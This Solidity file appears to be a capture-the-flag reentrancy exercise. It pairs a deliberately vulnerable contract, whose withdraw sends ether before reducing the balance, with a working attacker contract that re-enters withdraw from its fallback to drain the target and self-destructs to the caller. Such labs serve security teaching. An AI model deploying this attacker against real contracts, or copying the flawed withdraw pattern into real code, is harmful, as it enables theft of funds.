// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "hardhat/console.sol";

contract Reentrance {
  
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to] + (msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    console.log('withdraw');
    if(balances[msg.sender] >= _amount) {
        console.log(balances[msg.sender]);
        console.log(_amount);
        (bool result, ) = msg.sender.call{value:_amount}("");
        console.log(result);
        if(result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
        console.log('withdraw completed');
    }
  }

  receive() external payable {}
}

contract AttackerReentrance {

    Reentrance reentrance;

    constructor(address payable contractAddress) public {
        reentrance = Reentrance(contractAddress);
    }

    function deposit() public payable {
        reentrance.donate{ value: msg.value }(address(this));
    }

    function attack() public payable {
        console.log('attack');
        reentrance.withdraw(1 ether);
        
        require(address(reentrance).balance == 0, "target balance > 0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        console.log('receive');
        uint amount = min(1 ether, address(reentrance).balance);
        if(amount > 0) {
            reentrance.withdraw(1 ether);
        }
    }

    function min(uint x, uint y) private pure returns (uint) {
        return  x <= y ? x : y;
    }
}